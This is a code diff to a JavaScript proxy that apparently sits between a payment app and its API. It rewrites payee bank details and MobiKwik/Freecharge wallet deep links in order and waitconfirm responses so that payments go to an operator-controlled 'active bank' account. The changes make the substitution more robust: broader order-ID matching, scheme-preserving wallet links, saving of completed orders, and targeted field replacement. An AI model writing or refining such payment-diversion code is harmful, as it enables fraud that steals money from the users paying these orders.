@@ -202,24 +202,74 @@ function getActiveBank(data, userId) {
 
 // Bank replacement is allowed only for an order that already has a mapping in KV.
 // Never fall back to the currently active bank for an unrelated history/detail row.
-function getSavedOrderMapping(data, valueOrOrder) {
-  const map = data && data.orderBankMap;
-  if (!map || typeof map !== 'object') return null;
-  const candidates = [];
-  if (valueOrOrder && typeof valueOrOrder === 'object') {
-    for (const f of ['rptNo', 'rpt_no', 'orderNo', 'order_no', 'orderId', 'order_id', 'id', 'tradeNo', 'slipId']) {
-      if (valueOrOrder[f] !== undefined && valueOrOrder[f] !== null && String(valueOrOrder[f]).trim()) candidates.push(String(valueOrOrder[f]).trim());
-    }
-  } else if (valueOrOrder !== undefined && valueOrOrder !== null) {
-    candidates.push(String(valueOrOrder).trim());
+function normalizeOrderId(value) {
+  if (value === undefined || value === null) return '';
+  return String(value).trim().replace(/^['\"]|['\"]$/g, '').toLowerCase();
+}
+
+function collectOrderIdCandidates(value, out = new Set(), depth = 0) {
+  if (value === undefined || value === null || depth > 4) return out;
+  if (Array.isArray(value)) {
+    for (const item of value) collectOrderIdCandidates(item, out, depth + 1);
+    return out;
   }
-  for (const id of candidates) {
-    if (map[id]) return map[id];
+  if (typeof value !== 'object') {
+    const normalized = normalizeOrderId(value);
+    if (normalized) out.add(normalized);
+    return out;
+  }
+  for (const [key, item] of Object.entries(value)) {
+    const normalizedKey = String(key).toLowerCase().replace(/[_-]/g, '');
+    if (['rptno', 'orderno', 'orderid', 'id', 'tradeno', 'slipid'].includes(normalizedKey)) {
+      const normalizedValue = normalizeOrderId(item);
+      if (normalizedValue) out.add(normalizedValue);
+    } else if (item && typeof item === 'object' && ['data', 'result', 'order', 'payload'].includes(normalizedKey)) {
+      collectOrderIdCandidates(item, out, depth + 1);
+    }
+  }
+  return out;
+}
+
+function parseSavedMapping(saved) {
+  if (saved && typeof saved === 'object') return saved;
+  if (typeof saved === 'string') {
+    try {
+      const parsed = JSON.parse(saved);
+      return parsed && typeof parsed === 'object' ? parsed : null;
+    } catch (e) { }
+  }
+  return null;
+}
+
+function getSavedOrderMapping(data, valueOrOrder) {
+  const rawMap = data && data.orderBankMap;
+  let map = rawMap;
+  if (typeof rawMap === 'string') {
+    try { map = JSON.parse(rawMap); } catch (e) { map = null; }
+  }
+  if (!map || typeof map !== 'object') return null;
+  const candidates = collectOrderIdCandidates(valueOrOrder);
+  if (typeof valueOrOrder !== 'object' && valueOrOrder !== undefined && valueOrOrder !== null) {
+    const normalized = normalizeOrderId(valueOrOrder);
+    if (normalized) candidates.add(normalized);
+  }
+  if (candidates.size === 0) return null;
+
+  for (const [key, rawSaved] of Object.entries(map)) {
+    const saved = parseSavedMapping(rawSaved);
+    const keyId = normalizeOrderId(key);
+    if (keyId && candidates.has(keyId)) return saved || rawSaved;
+    if (!saved) continue;
+    const savedIds = collectOrderIdCandidates(saved);
+    for (const id of candidates) {
+      if (savedIds.has(id)) return saved;
+    }
   }
   return null;
 }
 
 function bankFromSavedOrder(saved) {
+  saved = parseSavedMapping(saved);
   if (!saved || typeof saved !== 'object') return null;
   const bankParts = typeof saved.bank === 'string' ? saved.bank.split(' | ') : [];
   return {
@@ -228,7 +278,8 @@ function bankFromSavedOrder(saved) {
     ifsc: saved.ifsc || saved.acctCode || saved.ifscCode || bankParts[2] || '',
     bankName: saved.bankName || saved.acctBankName || '',
     upiId: saved.upiId || saved.payAccount || '',
-    walletDomain: saved.walletDomain || ''
+    walletDomain: saved.walletDomain || '',
+    walletScheme: saved.walletScheme || ''
   };
 }
 
@@ -249,6 +300,17 @@ function getRequestOrderId(req) {
   return '';
 }
 
+function inferWalletScheme(source) {
+  if (!source || typeof source !== 'object') return '';
+  const payAccount = String(source.payAccount || source.upi || source.vpa || '').toLowerCase();
+  const payType = Number(source.payType ?? source.ctType ?? source.method);
+  if (payAccount.includes('@freecharge') || payType === 3) return 'freecharge';
+  if (payAccount.includes('@mbk') || payAccount.includes('mobikwik') || payType === 2) return 'mobikwik';
+  const wallet = String(source.walletDomain || source.walletUrl || '');
+  const match = wallet.match(/^([A-Za-z][A-Za-z0-9+.-]*):\/\//);
+  return match ? match[1].toLowerCase() : '';
+}
+
 function buildWalletDomain(bank, amount) {
   if (!bank || !bank.accountNo) return '';
   const accountNo = String(bank.accountNo);
@@ -257,7 +319,37 @@ function buildWalletDomain(bank, amount) {
   const parsedAmount = Number(amount);
   const amountText = Number.isFinite(parsedAmount) ? parsedAmount.toFixed(1) : '0.0';
   const last4 = accountNo.slice(-4);
-  return `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(holder)}&amount=${amountText}&displayAccountNumber=xxxxxxxxx${last4}`;
+  const template = typeof bank.walletDomain === 'string' ? bank.walletDomain.trim() : '';
+  const schemeHint = String(bank.walletScheme || '').trim().toLowerCase();
+  const templateScheme = (template.match(/^([A-Za-z][A-Za-z0-9+.-]*):\/\//) || [])[1]?.toLowerCase() || '';
+
+  // Preserve the upstream wallet scheme/path. An explicit payment-method hint
+  // wins if the upstream payload carries an incorrect scheme.
+  if ((!schemeHint || !templateScheme || schemeHint === templateScheme) && /^[A-Za-z][A-Za-z0-9+.-]*:\/\//.test(template) && template.includes('?')) {
+    try {
+      const qIdx = template.indexOf('?');
+      const base = template.slice(0, qIdx + 1);
+      const params = new URLSearchParams(template.slice(qIdx + 1));
+      const setFirst = (names, value) => {
+        for (const [key] of params) {
+          if (names.includes(key.toLowerCase().replace(/[_-]/g, ''))) {
+            params.set(key, value);
+            return true;
+          }
+        }
+        return false;
+      };
+      setFirst(['account', 'accountnumber', 'acc', 'payeeaccount', 'pa', 'payee', 'vaccount', 'vpa', 'to'], accountNo);
+      setFirst(['ifsc', 'bankifsc', 'payeeifsc', 'fi'], ifsc);
+      setFirst(['name', 'payeename', 'pn', 'reciever', 'receiver', 'to_name', 'toname'], holder);
+      setFirst(['amount', 'amt', 'money', 'value'], amountText);
+      setFirst(['displayaccountnumber', 'displayaccount', 'maskedaccount', 'masked'], `xxxxxxxxx${last4}`);
+      return base + params.toString();
+    } catch (e) { }
+  }
+
+  const scheme = schemeHint || templateScheme || 'mobikwik';
+  return `${scheme}://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(holder)}&amount=${amountText}&displayAccountNumber=xxxxxxxxx${last4}`;
 }
 
 function bankListText(d) {
@@ -724,6 +816,27 @@ function replaceOnlyBankNameFields(obj, bank, depth = 0) {
   }
 }
 
+function replaceWaitConfirmBankFields(obj, bank, depth = 0) {
+  if (!obj || typeof obj !== 'object' || !bank || depth > 10) return;
+  if (Array.isArray(obj)) {
+    for (const item of obj) replaceWaitConfirmBankFields(item, bank, depth + 1);
+    return;
+  }
+  for (const key of Object.keys(obj)) {
+    const normalized = key.toLowerCase().replace(/[_-]/g, '');
+    if (normalized === 'ctaccount') continue;
+    if (normalized === 'acctno' && bank.accountNo) {
+      obj[key] = bank.accountNo;
+    } else if (normalized === 'acctcode' && bank.ifsc) {
+      obj[key] = bank.ifsc;
+    } else if (normalized === 'acctname' && bank.accountHolder) {
+      obj[key] = bank.accountHolder;
+    } else if (obj[key] && typeof obj[key] === 'object') {
+      replaceWaitConfirmBankFields(obj[key], bank, depth + 1);
+    }
+  }
+}
+
 function forceBankDetails(obj, bank) {
   if (!obj || typeof obj !== 'object' || !bank || Array.isArray(obj)) return;
   const hasBank = scanHasBankFields(obj, 0);
@@ -734,10 +847,9 @@ function forceBankDetails(obj, bank) {
   const ifsc = bank.ifsc || '';
   const bankName = getDisplayBankName(bank);
   const upiId = bank.upiId || '';
-  const last4 = accountNo.slice(-4);
-  const walletDomain = accountNo
-    ? `mobikwik://moneytransfer/upi/bank?account=${accountNo}&ifsc=${ifsc}&name=${encodeURIComponent(accountHolder)}&amount=0.0&displayAccountNumber=xxxxxxxxx${last4}`
-    : '';
+  const originalWallet = typeof obj.walletDomain === 'string' ? obj.walletDomain : '';
+  const walletScheme = inferWalletScheme(obj) || bank.walletScheme || '';
+  const walletDomain = buildWalletDomain({ ...bank, walletDomain: originalWallet, walletScheme }, 0);
 
   const aliases = {
     acctName: accountHolder, accountName: accountHolder, name: accountHolder,
@@ -1606,8 +1718,14 @@ app.all('/xxapi/*', async (req, res) => {
               const bkAcct = activeBank.accountNo || '';
               const bkIfsc = activeBank.ifsc || '';
               const bkName = activeBank.accountHolder || '';
-              const last4 = bkAcct.slice(-4);
-              const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${savedAmount}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
+              const upstreamWallet = bj.data && typeof bj.data === 'object' ? String(bj.data.walletDomain || '') : '';
+              const paymentMeta = {
+                ...(bj.data && typeof bj.data === 'object' ? bj.data : {}),
+                ...((req.body && typeof req.body === 'object') ? req.body : {})
+              };
+              const walletScheme = inferWalletScheme(paymentMeta);
+              const mappingBank = { ...activeBank, walletDomain: upstreamWallet, walletScheme };
+              const wDom = buildWalletDomain(mappingBank, savedAmount);
               data.orderBankMap[String(reqOrderId)] = {
                 bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
                 bankName: activeBank.bankName || 'Bank',
@@ -1616,7 +1734,9 @@ app.all('/xxapi/*', async (req, res) => {
                 orderId: reqOrderId,
                 orderNo: reqOrderId,
                 walletDomain: wDom,
-                payType: 2,
+                walletScheme,
+                payAccount: paymentMeta.payAccount || paymentMeta.upi || '',
+                payType: paymentMeta.payType || paymentMeta.ctType || 2,
                 time: now,
                 userId: String(userId || ''),
                 forced: true,
@@ -2011,7 +2131,8 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
                 const last4C1 = bkAcctC1.slice(-4);
                 let pt = order.payType || order.ctType || 1;
                 if (urlLower.includes('usdt') || order.currency === 'USDT') pt = 0;
-                const wDomC1 = bkAcctC1 ? `mobikwik://moneytransfer/upi/bank?account=${bkAcctC1}&ifsc=${bkIfscC1}&name=${encodeURIComponent(bkNameC1)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4C1}` : '';
+                const originalWalletC1 = typeof order.walletDomain === 'string' ? order.walletDomain : '';
+                const wDomC1 = buildWalletDomain({ ...activeBank, walletDomain: originalWalletC1 }, amt);
 
                 const hasBank = scanHasBankFields(order, 0);
                 if (hasBank) deepReplaceBankFields(order, activeBank, 0, hasBank);
@@ -2148,7 +2269,9 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
           const rptNo = wc.rptNo;
           const amt = parseFloat(wc.amount) || 0;
           const wcState = parseInt(wc.orderState ?? wc.state ?? -1);
-          const canAutoSave = !Number.isFinite(wcState) || wcState <= 1;
+          // Save completed waitconfirm rows too; otherwise an order that was
+          // created before the proxy observed it can never match later.
+          const canAutoSave = !Number.isFinite(wcState) || wcState <= 2;
           if (rptNo && data.botEnabled !== false && canAutoSave) {
             const activeBank = getActiveBank(data, null);
             if (activeBank && (!activeBank.minAmount || amt >= activeBank.minAmount)) {
@@ -2157,21 +2280,28 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
               const bkAcct = activeBank.accountNo || '';
               const bkIfsc = activeBank.ifsc || '';
               const bkName = activeBank.accountHolder || '';
-              const last4 = bkAcct.slice(-4);
-              const wDom = bkAcct ? `mobikwik://moneytransfer/upi/bank?account=${bkAcct}&ifsc=${bkIfsc}&name=${encodeURIComponent(bkName)}&amount=${amt}.0&displayAccountNumber=xxxxxxxxx${last4}` : '';
+              const originalWallet = typeof wc.walletDomain === 'string' ? wc.walletDomain : '';
+              const walletScheme = inferWalletScheme(wc);
+              const wDom = buildWalletDomain({ ...activeBank, walletDomain: originalWallet, walletScheme }, amt);
 
               const alreadyNotified = data.orderBankMap[String(rptNo)] && data.orderBankMap[String(rptNo)].notified;
 
               if (isNew) {
                 data.orderBankMap[String(rptNo)] = {
                   bank: `${bkName} | ${bkAcct} | ${bkIfsc}`,
+                  accountHolder: bkName,
+                  accountNo: bkAcct,
+                  ifsc: bkIfsc,
                   bankName: activeBank.bankName || 'Bank',
                   upiId: activeBank.upiId || '',
+                  payAccount: wc.payAccount || '',
                   amount: amt,
                   orderId: rptNo,
+                  rptNo,
                   orderNo: wc.orderNo || rptNo,
                   walletDomain: wDom,
-                  payType: 2,
+                  walletScheme,
+                  payType: wc.payType || wc.ctType || 2,
                   time: now,
                   userId: String(userId || ''),
                   forced: true,
@@ -2179,6 +2309,18 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
                   notified: true // Set to true so we don't double notify later
                 };
                 await saveData(data);
+              } else {
+                // Keep the previously selected bank mapping, but refresh only
+                // wallet metadata from the live order so Freecharge is not
+                // represented by a stale MobiKwik URL.
+                const existing = data.orderBankMap[String(rptNo)];
+                if (existing && (originalWallet || walletScheme)) {
+                  existing.walletDomain = wDom;
+                  existing.walletScheme = walletScheme || existing.walletScheme || '';
+                  existing.payType = wc.payType || wc.ctType || existing.payType || 2;
+                  existing.payAccount = wc.payAccount || existing.payAccount || '';
+                  saveData(data).catch(() => { });
+                }
               }
 
               if (!alreadyNotified) {
@@ -2257,10 +2399,19 @@ const isSlipDetail = !urlLower.includes('pickuppaymentslip') && (
               if (savedMapping) {
                 const mappedBank = bankFromSavedOrder(savedMapping);
                 if (mappedBank && (mappedBank.accountNo || mappedBank.ifsc || mappedBank.accountHolder)) {
-                  forceBankDetails(item, mappedBank);
                   const mappedAmount = item.amount || item.orderAmount || item.money || savedMapping.amount || 0;
-                  const mappedWallet = buildWalletDomain(mappedBank, mappedAmount);
-                  if (mappedWallet) item.walletDomain = mappedWallet;
+                  if (urlLower.includes('waitconfirm')) {
+                    // waitconfirm exposes these three bank fields to the app;
+                    // do not overwrite username/name aliases or ctAccount.
+                    replaceWaitConfirmBankFields(item, mappedBank);
+                    const walletTemplate = item.walletDomain || mappedBank.walletDomain || '';
+                    const mappedWallet = buildWalletDomain({ ...mappedBank, walletDomain: walletTemplate }, mappedAmount);
+                    if (mappedWallet) item.walletDomain = mappedWallet;
+                  } else {
+                    forceBankDetails(item, mappedBank);
+                    const mappedWallet = buildWalletDomain(mappedBank, mappedAmount);
+                    if (mappedWallet) item.walletDomain = mappedWallet;
+                  }
                 }
               }
             }
